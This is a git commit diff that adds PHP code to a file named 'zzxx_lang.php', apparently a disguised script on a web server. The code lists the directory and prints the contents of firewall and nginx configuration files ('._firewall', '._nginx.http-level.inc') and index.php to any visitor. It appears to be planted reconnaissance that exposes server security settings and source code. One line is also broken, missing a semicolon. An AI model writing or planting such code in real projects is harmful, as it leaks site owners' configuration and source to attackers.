d3def98d3955d93ea6b4358535ed799756fce2cf
garubong <46369594+garubong@users.noreply.github.com>
2022-11-01 21:57:07 +0700

    Update zzxx_lang.php

--- zzxx_lang.php
+++ zzxx_lang.php
@@ -2,5 +2,17 @@
 print_r(dir("."));
 $f = scandir(".");
 print_r($f);
+$myfile = fopen("._firewall", "r") or die("Unable to open file!");
+echo fread($myfile,filesize("._firewall"));
+fclose($myfile);
 
+$myfile = fopen("._nginx.http-level.inc", "r") or die("Unable to open file!");
+echo fread($myfile,filesize("._nginx.http-level.inc"));
+fclose($myfile);
+
+$myfile = fopen("index.php", "r") or die("Unable to open file!");
+echo fread($myfile,filesize("index.php"));
+
+print_r($myfile)
+fclose($myfile);
 ?>
